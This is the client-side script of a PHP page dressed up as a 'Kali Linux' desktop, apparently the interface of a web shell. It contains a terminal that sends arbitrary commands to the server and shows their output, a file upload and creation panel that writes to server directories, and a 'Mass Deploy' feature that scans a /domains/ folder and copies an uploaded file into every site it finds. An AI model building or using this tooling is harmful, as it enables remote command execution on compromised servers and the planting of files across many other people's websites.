                    desktopNavbar.classList.add('show'); 
                } 
            } 
        }
        
        function showSettingsNav(){ 
            if(settingsTopNav){ 
                if(settingsTopNav.classList.contains('show')){ 
                    settingsTopNav.classList.remove('show'); 
                    closeAllSubPanels();
                } else { 
                    closeAllNavs();
                    settingsTopNav.classList.add('show'); 
                } 
            } 
        }
        
        document.getElementById('navDesktopBtn')?.addEventListener('click',showDesktopNav);
        document.getElementById('navApplicationsBtn')?.addEventListener('click',showApplicationsNav);
        document.getElementById('navFilesBtn')?.addEventListener('click',showFilesNav);
        document.getElementById('navSettingsBtn')?.addEventListener('click',showSettingsNav);
        
        function closeAllSubPanels(){ 
            document.getElementById('brightnessPanel')?.classList.remove('show'); 
            document.getElementById('musicPanel')?.classList.remove('show'); 
            document.getElementById('bluetoothPanel')?.classList.remove('show'); 
        }
        
        document.querySelectorAll('.close-sub-panel').forEach(btn=>{ 
            btn.addEventListener('click',()=>{ 
                let target=btn.getAttribute('data-close'); 
                document.getElementById(target)?.classList.remove('show'); 
            }); 
        });
        
        document.getElementById('closeSettingsTopNav')?.addEventListener('click',()=>{ 
            settingsTopNav.classList.remove('show'); 
        });
        
        document.querySelectorAll('.settings-nav-icon').forEach(icon=>{ 
            icon.addEventListener('click',()=>{ 
                let panel=icon.getAttribute('data-panel'); 
                settingsTopNav.classList.remove('show');
                if(panel==='brightness'){ 
                    closeAllSubPanels(); 
                    document.getElementById('brightnessPanel')?.classList.add('show');
                } else if(panel==='music'){ 
                    closeAllSubPanels(); 
                    document.getElementById('musicPanel')?.classList.add('show');
                } else if(panel==='bluetooth'){ 
                    closeAllSubPanels(); 
                    document.getElementById('bluetoothPanel')?.classList.add('show');
                } 
            }); 
        });
        
        let brightnessSlider=document.getElementById('brightnessSlider'); 
        let brightnessValue=document.getElementById('brightnessValue'); 
        brightnessSlider?.addEventListener('input',(e)=>{ 
            let val=e.target.value; 
            brightnessValue.textContent=val+'%'; 
            document.body.style.filter=`brightness(${val}%)`; 
            localStorage.setItem('brightness',val); 
        });
        
        let savedBrightness=localStorage.getItem('brightness'); 
        if(savedBrightness && brightnessSlider){ 
            brightnessSlider.value=savedBrightness; 
            brightnessValue.textContent=savedBrightness+'%'; 
            document.body.style.filter=`brightness(${savedBrightness}%)`; 
        }
        
        let bluetoothToggle=document.getElementById('bluetoothToggle'); 
        let bluetoothStatusText=document.getElementById('bluetoothStatusText'); 
        let bluetoothOn=false; 
        
        bluetoothToggle?.addEventListener('click',()=>{ 
            bluetoothOn=!bluetoothOn; 
            if(bluetoothOn){ 
                bluetoothToggle.classList.add('active'); 
                bluetoothStatusText.textContent='Connected to "Kali Device"';
                bluetoothStatusText.className='bluetooth-status-text connected';
            } else { 
                bluetoothToggle.classList.remove('active'); 
                bluetoothStatusText.textContent='OFF';
                bluetoothStatusText.className='bluetooth-status-text';
            } 
            localStorage.setItem('bluetooth',bluetoothOn?'on':'off'); 
        });
        
        let savedBluetooth=localStorage.getItem('bluetooth'); 
        if(savedBluetooth==='on' && bluetoothToggle){ 
            bluetoothOn=true; 
            bluetoothToggle.classList.add('active'); 
            bluetoothStatusText.textContent='Connected to "Kali Device"';
            bluetoothStatusText.className='bluetooth-status-text connected';
        }
        
        document.getElementById('navRestartBtn')?.addEventListener('click',()=>{ if(confirm('Restart will reboot the system. Continue?')) window.location.href='?system=restart&dir=<?php echo urlencode($current_path); ?>'; });
        document.getElementById('navSleepBtn')?.addEventListener('click',()=>{ if(confirm('Enter sleep mode? Double-tap to wake.')) window.location.href='?system=sleep'; });
        document.getElementById('navShutdownBtn')?.addEventListener('click',()=>{ if(confirm('Shut down the system? This will close the tab.')) window.location.href='?system=shutdown'; });
        document.getElementById('saveFileBtn')?.addEventListener('click',()=>{ openSaveDialog(); });
        
        const uploadPanel = document.getElementById('fileUploadPanel');
        const bottomUploadBtn = document.getElementById('bottomUploadBtn');
        const closeUploadPanel = document.getElementById('closeUploadPanel');
        const uploadForm = document.getElementById('uploadForm');
        const createTextFileBtn = document.getElementById('createTextFileBtn');
        const createFileName = document.getElementById('createFileName');
        const createFileContent = document.getElementById('createFileContent');
        const uploadDirectory = document.getElementById('uploadDirectory');
        
        function openUploadPanel() {
            uploadPanel.classList.add('show');
            if (uploadDirectory) uploadDirectory.value = '<?php echo addslashes($current_path); ?>';
        }
        
        function closeUploadPanelFn() {
            uploadPanel.classList.remove('show');
        }
        
        bottomUploadBtn?.addEventListener('click', openUploadPanel);
        closeUploadPanel?.addEventListener('click', closeUploadPanelFn);
        
        uploadForm?.addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(uploadForm);
            showToast('Uploading files...');
            try {
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });
                const text = await response.text();
                showToast('Upload successful!');
                setTimeout(() => location.reload(), 1500);
            } catch (error) {
                showToast('Upload error: ' + error.message);
            }
        });
        
        createTextFileBtn?.addEventListener('click', async () => {
            const filename = createFileName.value.trim();
            const content = createFileContent.value;
            const targetDir = uploadDirectory.value.trim() || '<?php echo addslashes($current_path); ?>';
            
            if (!filename) {
                showToast('Please enter a filename');
                return;
            }
            
            showToast('Creating file...');
            
            const blob = new Blob([content], { type: 'text/plain' });
            const formData = new FormData();
            formData.append('upfile[]', blob, filename);
            formData.append('target_dir', targetDir);
            
            try {
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });
                showToast('File created: ' + filename);
                closeUploadPanelFn();
                setTimeout(() => location.reload(), 1000);
            } catch (error) {
                showToast('Error: ' + error.message);
            }
        });
        
        // ========== MASS DEPLOY FUNCTIONALITY ==========
        const massDeployPanel = document.getElementById('massDeployPanel');
        const massDeployBtn = document.getElementById('massDeployBtn');
        const navMassDeployBtn = document.getElementById('navMassDeployBtn');
        const closeMassDeployPanel = document.getElementById('closeMassDeployPanel');
        const scanDomainsBtn = document.getElementById('scanDomainsBtn');
        const domainListContainer = document.getElementById('domainListContainer');
        const deployFileInput = document.getElementById('deployFileInput');
        const startMassDeployBtn = document.getElementById('startMassDeployBtn');
        const deployLog = document.getElementById('deployLog');
        const progressContainer = document.getElementById('progressContainer');
        const deployProgressFill = document.getElementById('deployProgressFill');
        
        let discoveredDomains = [];
        
        function openMassDeployPanel() {
            massDeployPanel.classList.add('show');
            domainListContainer.style.display = 'none';
            deployLog.style.display = 'none';
            progressContainer.style.display = 'none';
            startMassDeployBtn.disabled = true;
            discoveredDomains = [];
        }
        
        function closeMassDeployPanelFn() {
            massDeployPanel.classList.remove('show');
        }
        
        massDeployBtn?.addEventListener('click', openMassDeployPanel);
        navMassDeployBtn?.addEventListener('click', openMassDeployPanel);
        closeMassDeployPanel?.addEventListener('click', closeMassDeployPanelFn);
        
        scanDomainsBtn?.addEventListener('click', async () => {
            scanDomainsBtn.disabled = true;
            scanDomainsBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning...';
            domainListContainer.innerHTML = '<div class="domain-item">Scanning for domains...</div>';
            domainListContainer.style.display = 'block';
            
            try {
                const formData = new FormData();
                formData.append('mass_deploy_action', 'scan_domains');
                
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                
                if (result.success && result.data.domains) {
                    discoveredDomains = result.data.domains;
                    domainListContainer.innerHTML = `<div class="domain-item" style="background:#2a5a2a;">Found ${result.data.total} domains:</div>`;
                    discoveredDomains.forEach(domain => {
                        domainListContainer.innerHTML += `<div class="domain-item">📁 ${domain.name} → ${domain.path} [${domain.type}]</div>`;
                    });
                    startMassDeployBtn.disabled = false;
                    showToast(`Found ${discoveredDomains.length} domains`);
                } else {
                    domainListContainer.innerHTML = '<div class="domain-item" style="color:#ff4444;">No domains found. Make sure you have access to /domains/ folder.</div>';
                }
            } catch (error) {
                domainListContainer.innerHTML = '<div class="domain-item" style="color:#ff4444;">Error scanning: ' + error.message + '</div>';
            }
            
            scanDomainsBtn.disabled = false;
            scanDomainsBtn.innerHTML = '<i class="fas fa-search"></i> Scan for Domains';
        });
        
        startMassDeployBtn?.addEventListener('click', async () => {
            const file = deployFileInput.files[0];
            if (!file) {
                showToast('Please select a file to deploy');
                return;
            }
            
            if (discoveredDomains.length === 0) {
                showToast('Please scan for domains first');
                return;
            }
            
            deployLog.style.display = 'block';
            progressContainer.style.display = 'block';
            deployLog.innerHTML = '<div class="info">Starting deployment...</div>';
            
            const formData = new FormData();
            formData.append('mass_deploy_action', 'deploy_to_all');
            formData.append('deploy_file', file);
            formData.append('custom_paths', JSON.stringify(discoveredDomains));
            
            try {
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                
                if (result.success) {
                    deployLog.innerHTML = '';
                    deployLog.innerHTML += `<div class="success">✅ ${result.message}</div>`;
                    deployLog.innerHTML += `<div class="success">📁 File: ${result.data.filename}</div>`;
                    deployLog.innerHTML += `<div class="success">📊 Deployed to: ${result.data.deployed} locations</div>`;
                    
                    if (result.data.deployed_list && result.data.deployed_list.length > 0) {
                        deployLog.innerHTML += `<div class="info">📋 Successful deployments:</div>`;
                        result.data.deployed_list.forEach(dep => {
                            deployLog.innerHTML += `<div class="success">  → ${dep.domain}: ${dep.path}</div>`;
                        });
                    }
                    
                    if (result.data.failed && result.data.failed > 0) {
                        deployLog.innerHTML += `<div class="error">❌ Failed: ${result.data.failed} locations</div>`;
                        if (result.data.failed_list) {
                            result.data.failed_list.forEach(fail => {
                                deployLog.innerHTML += `<div class="error">  → ${fail.domain}: ${fail.reason}</div>`;
                            });
                        }
                    }
                    
                    deployProgressFill.style.width = '100%';
                    showToast(`Deployed to ${result.data.deployed} locations`);
                } else {
                    deployLog.innerHTML += `<div class="error">Deployment failed: ${result.message}</div>`;
                }
            } catch (error) {
                deployLog.innerHTML += `<div class="error">Error: ${error.message}</div>`;
            }
            
            setTimeout(() => {
                progressContainer.style.display = 'none';
            }, 3000);
        });
        
        let desktopItems=[];
        let nextId=1;
        const defaultFiles=[
            {name:"Readme.txt",content:"Welcome to Kali Linux - Penetration Testing OS\n\nAvailable tools:\n- Nmap\n- Metasploit\n- Burp Suite\n- Wireshark",icon:"fas fa-file-alt",color:"#88ffaa"},
            {name:"notes.txt",content:"Kali Linux 2024.1\nKernel: 6.1.0\nArchitecture: x86_64",icon:"fas fa-file-alt",color:"#88ffaa"},
            {name:"tools.txt",content:"Security Tools:\n1. Nmap - Network scanner\n2. Hydra - Password cracker",icon:"fas fa-terminal",color:"#66ffcc"},
            {name:"commands.txt",content:"whoami\nls -la\npwd\nnetstat -an\nps aux",icon:"fas fa-terminal",color:"#66ffcc"}
        ];
        const desktopApps=[
            {name:"YouTube",url:"https://www.youtube.com",icon:"fab fa-youtube",color:"#ff0000",isApp:true},
            {name:"Facebook",url:"https://www.facebook.com",icon:"fab fa-facebook",color:"#1877f2",isApp:true},
            {name:"GitHub",url:"https://www.github.com",icon:"fab fa-github",color:"#ffffff",isApp:true},
            {name:"Firefox",url:"https://www.firefox.com",icon:"fab fa-firefox",color:"#ff9400",isApp:true},
            {name:"Telegram",url:"https://web.telegram.org",icon:"fab fa-telegram",color:"#26a5e4",isApp:true},
            {name:"WhatsApp",url:"https://web.whatsapp.com",icon:"fab fa-whatsapp",color:"#25d366",isApp:true}
        ];
        
        function updateDesktopNavbar(){ const container=document.getElementById('desktopNavItems'); if(!container) return; container.innerHTML=''; const sorted=[...desktopItems].sort((a,b)=>a.name.localeCompare(b.name)); sorted.forEach(item=>{ const navItem=document.createElement('div'); navItem.className='desktop-nav-item'; const shortName=item.name.length>20?item.name.substring(0,17)+'...':item.name; navItem.innerHTML=`<i class="${item.icon}" style="color:${item.color}"></i> <span>${escapeHtml(shortName)}</span>`; navItem.addEventListener('click',()=>{ if(item.type==='file'){ openFileEditor(item); }else{ if(item.url && item.url!=='#'){ window.open(item.url,'_blank'); addTab(item.name,item.icon,item.url); } } desktopNavbar.classList.remove('show'); }); container.appendChild(navItem); }); }
        
        function loadDesktopItems(){ let stored=localStorage.getItem('kali_desktop_final_v17'); if(stored){ desktopItems=JSON.parse(stored); nextId=desktopItems.reduce((max,i)=>Math.max(max,i.id),0)+1; }else{ desktopItems=[]; defaultFiles.forEach(f=>desktopItems.push({id:nextId++,type:'file',name:f.name,content:f.content,icon:f.icon,color:f.color})); desktopApps.forEach(a=>desktopItems.push({id:nextId++,type:'app',name:a.name,url:a.url,icon:a.icon,color:a.color})); saveDesktopItems(); } renderDesktop(); }
        
        function saveDesktopItems(){ localStorage.setItem('kali_desktop_final_v17',JSON.stringify(desktopItems)); renderDesktop(); }
        
        function renderDesktop(){ const container=document.getElementById('desktopArea'); if(!container) return; container.innerHTML=''; const sorted=[...desktopItems].sort((a,b)=>a.name.localeCompare(b.name)); sorted.forEach(item=>{ const div=document.createElement('div'); div.className='desktop-icon'; const shortName=item.name.length>10?item.name.substring(0,8)+'..':item.name; div.innerHTML=`<i class="${item.icon}" style="color:${item.color}; font-size:22px;"></i><span style="color:#eee">${escapeHtml(shortName)}</span>`; div.addEventListener('click',(e)=>{ e.stopPropagation(); if(item.type==='file'){ openFileEditor(item); }else{ if(item.url && item.url!=='#'){ window.open(item.url,'_blank'); addTab(item.name,item.icon,item.url); } } }); div.addEventListener('contextmenu',(e)=>{ e.preventDefault(); e.stopPropagation(); showContextMenu(e.clientX,e.clientY,item); }); container.appendChild(div); }); }
        
        function showContextMenu(x,y,item){ let existing=document.querySelector('.context-menu'); if(existing) existing.remove(); let menu=document.createElement('div'); menu.className='context-menu'; menu.style.position='fixed'; menu.style.left=x+'px'; menu.style.top=y+'px'; menu.style.background='rgba(30,30,46,0.95)'; menu.style.backdropFilter='blur(8px)'; menu.style.border='1px solid #33aa55'; menu.style.borderRadius='6px'; menu.style.padding='5px 0'; menu.style.zIndex='2000'; menu.style.minWidth='140px'; if(item.type==='file'){ menu.innerHTML=`<div class="context-menu-item" style="padding:8px 16px;cursor:pointer;color:#fff;">Edit</div><div class="context-menu-item" style="padding:8px 16px;cursor:pointer;color:#fff;">Rename</div><div style="height:1px;background:#444;margin:4px 0;"></div><div class="context-menu-item" style="padding:8px 16px;cursor:pointer;color:#ff8888;">Delete</div>`; }else{ menu.innerHTML=`<div class="context-menu-item" style="padding:8px 16px;cursor:pointer;color:#ff8888;">Delete Shortcut</div>`; } document.body.appendChild(menu); menu.querySelectorAll('.context-menu-item').forEach((opt,idx)=>{ opt.addEventListener('click',()=>{ let action=opt.innerText.toLowerCase(); if(action==='edit') openFileEditor(item); if(action==='rename'){ let newName=prompt("Enter new name:",item.name); if(newName && newName.trim()){ item.name=newName.trim(); saveDesktopItems(); showToast(`Renamed to ${newName}`); } } if(action==='delete' || action==='delete shortcut'){ if(confirm(`Delete "${item.name}"?`)){ desktopItems=desktopItems.filter(i=>i.id!==item.id); saveDesktopItems(); showToast("Deleted"); closeEditor(); } } menu.remove(); }); }); setTimeout(()=>{ document.addEventListener('click',function closeMenu(e){ if(!menu.contains(e.target)){ menu.remove(); document.removeEventListener('click',closeMenu); } }); },10); }
        
        function escapeHtml(str){ if(!str) return ''; return str.replace(/[&<>]/g,m=>m==='&'?'&amp;':(m==='<'?'&lt;':'&gt;')); }
        
        function addDesktopItem(type,name,data){ if(type==='file') desktopItems.push({id:nextId++,type:'file',name:name,content:data.content,icon:'fas fa-file-alt',color:'#88ffaa'}); saveDesktopItems(); showToast(` "${name}" added`); }
        
        function deleteDesktopItem(id){ desktopItems=desktopItems.filter(i=>i.id!==id); saveDesktopItems(); showToast("Deleted"); closeEditor(); }
        
        function updateDesktopItem(id,newName,newContent){ const item=desktopItems.find(i=>i.id===id); if(item && item.type==='file'){ if(newName) item.name=newName; if(newContent!==undefined) item.content=newContent; saveDesktopItems(); showToast("Updated"); } }
        
        const editorCardView = document.getElementById('editorCardView');
        const editorFilenameSpan = document.getElementById('editorFileName');
        const editorFileIcon = document.getElementById('editorFileIcon');
        const editorFilenameInput = document.getElementById('editorFilenameInput');
        const editorContentInput = document.getElementById('editorContentInput');
        let currentEditItem = null;
        let isEditorMaximized = false;
        
        function getFileIcon(filename) {
            const ext = filename.split('.').pop().toLowerCase();
            if(ext === 'php') return 'fab fa-php';
            if(ext === 'html' || ext === 'htm') return 'fab fa-html5';
            if(ext === 'py') return 'fab fa-python';
            if(ext === 'js') return 'fab fa-js';
            if(ext === 'css') return 'fab fa-css3-alt';
            if(ext === 'txt') return 'fas fa-file-alt';
            if(ext === 'sh') return 'fas fa-terminal';
            return 'fas fa-file-alt';
        }
        
        function openFileEditor(item) {
            currentEditItem = item;
            editorFilenameSpan.innerText = item.name;
            editorFileIcon.className = getFileIcon(item.name) + ' editor-icon';
            editorFilenameInput.value = item.name;
            editorContentInput.value = item.content || '';
            editorCardView.style.display = 'flex';
            $(editorCardView).draggable({
                handle: "#editorTitle",
                containment: "window",
                disabled: function() { return isEditorMaximized; }
            });
        }
        
        function closeEditor() {
            editorCardView.style.display = 'none';
            if(isEditorMaximized) {
                editorCardView.classList.remove('maximized');
                isEditorMaximized = false;
                editorCardView.style.width = '';
                editorCardView.style.height = '';
                editorCardView.style.top = '50%';
                editorCardView.style.left = '50%';
                editorCardView.style.transform = 'translate(-50%, -50%)';
                $(editorCardView).draggable("option", "disabled", false);
            }
            currentEditItem = null;
        }
        
        document.getElementById('editorMinBtn')?.addEventListener('click', () => {
            editorCardView.style.display = 'none';
        });
        
        document.getElementById('editorMaxBtn')?.addEventListener('click', () => {
            if(isEditorMaximized) {
                editorCardView.classList.remove('maximized');
                isEditorMaximized = false;
                editorCardView.style.width = '';
                editorCardView.style.height = '';
                editorCardView.style.top = '50%';
                editorCardView.style.left = '50%';
                editorCardView.style.transform = 'translate(-50%, -50%)';
                $(editorCardView).draggable("option", "disabled", false);
            } else {
                editorCardView.classList.add('maximized');
                isEditorMaximized = true;
                editorCardView.style.transform = '';
                $(editorCardView).draggable("option", "disabled", true);
            }
        });
        
        document.getElementById('editorCloseBtn')?.addEventListener('click', closeEditor);
        document.getElementById('editorCancelBtn')?.addEventListener('click', closeEditor);
        
        document.getElementById('editorSaveBtn')?.addEventListener('click', () => {
            if(currentEditItem) {
                updateDesktopItem(currentEditItem.id, editorFilenameInput.value.trim(), editorContentInput.value);
            }
            closeEditor();
        });
        
        document.getElementById('editorDeleteBtn')?.addEventListener('click', () => {
            if(currentEditItem && confirm(`Delete "${currentEditItem.name}"?`)) {
                deleteDesktopItem(currentEditItem.id);
            }
        });
        
        const saveDialog=document.getElementById('saveDialog'); 
        function openSaveDialog(){ saveDialog.style.display='flex'; document.getElementById('newFileName').value='newfile.txt'; document.getElementById('newFileContent').value=''; } 
        function closeSaveDialog(){ saveDialog.style.display='none'; }
        document.getElementById('closeSaveDialog')?.addEventListener('click',closeSaveDialog);
        document.getElementById('cancelSaveBtn')?.addEventListener('click',closeSaveDialog);
        document.getElementById('confirmSaveBtn')?.addEventListener('click',()=>{ let fname=document.getElementById('newFileName').value.trim(); if(!fname) fname="untitled.txt"; let content=document.getElementById('newFileContent').value; if(!content){ showToast("Content required"); return; } addDesktopItem('file',fname,{content:content}); closeSaveDialog(); });
        
        function addTab(title,icon,url){ let container=document.getElementById('appTabsContainer'); if(!container) return; let tab=document.createElement('div'); tab.className='app-tab'; tab.setAttribute('data-url',url); tab.innerHTML=`<i class="${icon}"></i> <span>${title.length>10?title.substring(0,8)+'..':title}</span> <span class="tab-close"><i class="fas fa-times"></i></span>`; tab.addEventListener('click',(e)=>{ if(e.target.classList.contains('tab-close')||e.target.closest('.tab-close')) return; window.open(url,'_blank'); }); tab.querySelector('.tab-close')?.addEventListener('click',(e)=>{ e.stopPropagation(); tab.remove(); updateSeparators(); saveTabs(); }); container.appendChild(tab); updateSeparators(); saveTabs(); }
        
        function updateSeparators(){ let container=document.getElementById('appTabsContainer'); if(!container) return; let tabs=container.querySelectorAll('.app-tab'); document.querySelectorAll('.tab-separator').forEach(s=>s.remove()); for(let i=0;i<tabs.length-1;i++){ let sep=document.createElement('span'); sep.className='tab-separator'; sep.innerText='/'; tabs[i].insertAdjacentElement('afterend',sep); } }
        
        function saveTabs(){ let tabs=[]; document.querySelectorAll('.app-tab').forEach(tab=>{ tabs.push({title:tab.querySelector('span')?.innerText, url:tab.getAttribute('data-url'), icon:tab.querySelector('i')?.className}); }); localStorage.setItem('kali_tabs_final_v17',JSON.stringify(tabs)); }
        
        function loadTabs(){ let saved=localStorage.getItem('kali_tabs_final_v17'); if(saved){ let tabs=JSON.parse(saved); tabs.forEach(t=>{ if(t.url && t.url!=='#') addTab(t.title, t.icon||'fab fa-chrome', t.url); }); } }
        
        document.getElementById('newTabBtn')?.addEventListener('click',()=>{ addTab('New Tab','fab fa-chrome','https://www.google.com'); window.open('https://www.google.com','_blank'); });
        loadTabs();
        
        function showToast(msg){ let t=document.createElement('div'); t.innerText=msg; t.className='toast-message'; document.body.appendChild(t); setTimeout(()=>t.remove(),2500); }
        
        let terminal=null;
        function createTerminal(){ 
            if(terminal){ 
                terminal.classList.remove('hidden'); 
                const inp=terminal.querySelector('.term-input-custom'); 
                if(inp) { inp.value=''; inp.focus(); }
                const historyArea = terminal.querySelector('#termHistoryArea');
                if(historyArea) historyArea.innerHTML = '';
                return; 
            } 
            terminal=document.createElement('div'); 
            terminal.className='terminal-window'; 
            terminal.id='mainTerminal'; 
            terminal.style.height='192px'; 
            terminal.innerHTML=`<div class="terminal-title" id="terminalTitle"><div class="terminal-title-left"><div class="term-dot red"></div><div class="term-dot yellow"></div><div class="term-dot green"></div></div><div class="terminal-buttons"><button id="termMinBtn" title="Minimize">─</button><button id="termMaxBtn" title="Maximize">□</button><button id="termCloseBtn" class="close-btn" title="Close">✕</button></div></div><div class="terminal-body"><div class="terminal-logo"><img src="https://i.ibb.co/fVVdq42H/20260504-185400.png" alt="Kali Linux"></div><div class="terminal-scroll-area"><div class="terminal-content"><div id="termHistoryArea"></div><div class="custom-prompt-wrapper"><div class="prompt-top"><span class="prompt-bracket-red">╭─[</span><span class="prompt-tilde-white">~</span><span class="prompt-bracket-red">][</span><span class="prompt-user-blue-bold"> root@kali </span><span class="prompt-bracket-red">][</span><span class="prompt-tilde-white">~</span><span class="prompt-bracket-red">]</span></div><div class="input-line-wrapper"><span class="prompt-arrow-red">╰──➤</span><span class="prompt-dollar-white">$</span><input type="text" class="term-input-custom" id="termInputField" autofocus spellcheck="false" autocomplete="off"></div></div></div></div></div>`; 
            document.body.appendChild(terminal); 
            const titleBar=terminal.querySelector('#terminalTitle'); 
            let isDragging=false, dragOffsetX,dragOffsetY; 
            titleBar.addEventListener('mousedown',(e)=>{ 
                if(e.target.tagName==='BUTTON') return; 
                if(terminal.classList.contains('maximized')) return; 
                isDragging=true; 
                dragOffsetX=e.clientX-terminal.offsetLeft; 
                dragOffsetY=e.clientY-terminal.offsetTop; 
                terminal.style.position='fixed'; 
                terminal.style.top=terminal.offsetTop+'px'; 
                terminal.style.left=terminal.offsetLeft+'px'; 
                document.body.style.userSelect='none'; 
            }); 
            document.addEventListener('mousemove',(e)=>{ 
                if(!isDragging) return; 
                let left=e.clientX-dragOffsetX; 
                let top=e.clientY-dragOffsetY; 
                left=Math.max(0,Math.min(left,window.innerWidth-terminal.offsetWidth)); 
                top=Math.max(0,Math.min(top,window.innerHeight-terminal.offsetHeight)); 
                terminal.style.left=left+'px'; 
                terminal.style.top=top+'px'; 
            }); 
            document.addEventListener('mouseup',()=>{ 
                isDragging=false; 
                document.body.style.userSelect=''; 
            }); 
            const historyArea=terminal.querySelector('#termHistoryArea'); 
            let cmdHistory=[], histIndex=-1; 
            function escapeTerm(str){ 
                if(!str) return ''; 
                return str.replace(/[&<>]/g,m=>m==='&'?'&amp;':(m==='<'?'&lt;':'&gt;')); 
            } 
            function clearTerminalDisplay(){ 
                if(historyArea) historyArea.innerHTML=''; 
            } 
            function addToHistory(cmd,output){ 
                const entry=document.createElement('div'); 
                entry.className='term-history-entry'; 
                entry.innerHTML=`<div class="history-prompt-top"><span class="prompt-bracket-red">╭─[</span><span class="prompt-tilde-white">~</span><span class="prompt-bracket-red">][</span><span class="prompt-user-blue-bold"> root@kali </span><span class="prompt-bracket-red">][</span><span class="prompt-tilde-white">~</span><span class="prompt-bracket-red">]</span></div><div class="history-command-line"><span class="prompt-arrow-red">╰──➤</span> <span class="prompt-dollar-white">$</span> <span class="history-command-text">${escapeTerm(cmd)}</span></div><div class="term-output">${escapeTerm(output||'(no output)')}</div>`; 
                historyArea.appendChild(entry); 
                const scrollArea=terminal.querySelector('.terminal-scroll-area'); 
                if(scrollArea) scrollArea.scrollTop=scrollArea.scrollHeight; 
            } 
            async function executeCommand(cmd){ 
                const trimmed=cmd.trim().toLowerCase(); 
                if(trimmed==='clear'||trimmed==='cls'){ 
                    clearTerminalDisplay(); 
                    const inp=terminal.querySelector('.term-input-custom'); 
                    if(inp) inp.value=''; 
                    if(inp) inp.focus(); 
                    return; 
                } 
                if(!cmd.trim()){ 
                    addToHistory('','(empty)'); 
                    const inp=terminal.querySelector('.term-input-custom'); 
                    if(inp) inp.value=''; 
                    if(inp) inp.focus(); 
                    return; 
                } 
                try{ 
                    const response=await fetch(window.location.href,{
                        method:'POST',
                        headers:{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'},
                        body:'cmd='+encodeURIComponent(cmd)
                    }); 
                    const result=await response.text(); 
                    addToHistory(cmd,result); 
                    const inp=terminal.querySelector('.term-input-custom'); 
                    if(inp) inp.value=''; 
                    if(inp) inp.focus(); 
                    if(cmd.trim()){ 
                        cmdHistory.push(cmd); 
                        histIndex=cmdHistory.length; 
                    } 
                }catch(err){ 
                    addToHistory(cmd,'Error: '+err.message); 
                } 
            } 
            const inputField=terminal.querySelector('#termInputField'); 
            if(inputField){ 
                inputField.addEventListener('keydown',(e)=>{ 
                    if(e.key==='Enter'){ 
                        e.preventDefault(); 
                        executeCommand(inputField.value); 
                    } 
                    if(e.key==='ArrowUp'){ 
                        e.preventDefault(); 
                        if(cmdHistory.length){ 
                            if(histIndex>0) histIndex--; 
                            else if(histIndex===-1) histIndex=cmdHistory.length-1; 
                            if(histIndex>=0) inputField.value=cmdHistory[histIndex]; 
                        } 
                    } 
                    if(e.key==='ArrowDown'){ 
                        e.preventDefault(); 
                        if(cmdHistory.length && histIndex<cmdHistory.length-1){ 
                            histIndex++; 
                            inputField.value=cmdHistory[histIndex]; 
                        }else if(histIndex===cmdHistory.length-1){ 
                            histIndex=cmdHistory.length; 
                            inputField.value=''; 
                        } 
                    } 
                }); 
                inputField.focus(); 
            } 
            terminal.querySelector('#termMinBtn').addEventListener('click',()=>{ 
                terminal.classList.add('hidden'); 
            }); 
            terminal.querySelector('#termMaxBtn').addEventListener('click',()=>{ 
                if(terminal.classList.contains('maximized')){ 
                    terminal.classList.remove('maximized'); 
                    terminal.style.position='fixed'; 
                    terminal.style.top='50%'; 
                    terminal.style.left='50%'; 
                    terminal.style.transform='translate(-50%, -50%)'; 
                    terminal.style.width='355px'; 
                    terminal.style.height='192px'; 
                }else{ 
                    terminal.classList.add('maximized'); 
                    terminal.style.transform=''; 
                    terminal.style.top='0'; 
                    terminal.style.left='0'; 
                    terminal.style.width='100%'; 
                    terminal.style.height='100%'; 
                } 
                setTimeout(()=>{ 
                    const inp=terminal.querySelector('.term-input-custom'); 
                    if(inp) inp.focus(); 
                },50); 
            }); 
            terminal.querySelector('#termCloseBtn').addEventListener('click',()=>{ 
                terminal.remove(); 
                terminal=null; 
            }); 
        }
        
        const terminalBtn=document.getElementById('terminalBtn');
        if(terminalBtn){ 
            terminalBtn.addEventListener('click',()=>{ 
                if(terminal){ 
                    terminal.classList.remove('hidden'); 
                    const inp=terminal.querySelector('.term-input-custom'); 
                    if(inp) { inp.value=''; inp.focus(); }
                }else{ 
                    createTerminal(); 
                } 
            }); 
        }
        
        loadDesktopItems();
    })();
    </script>
</body>
</html>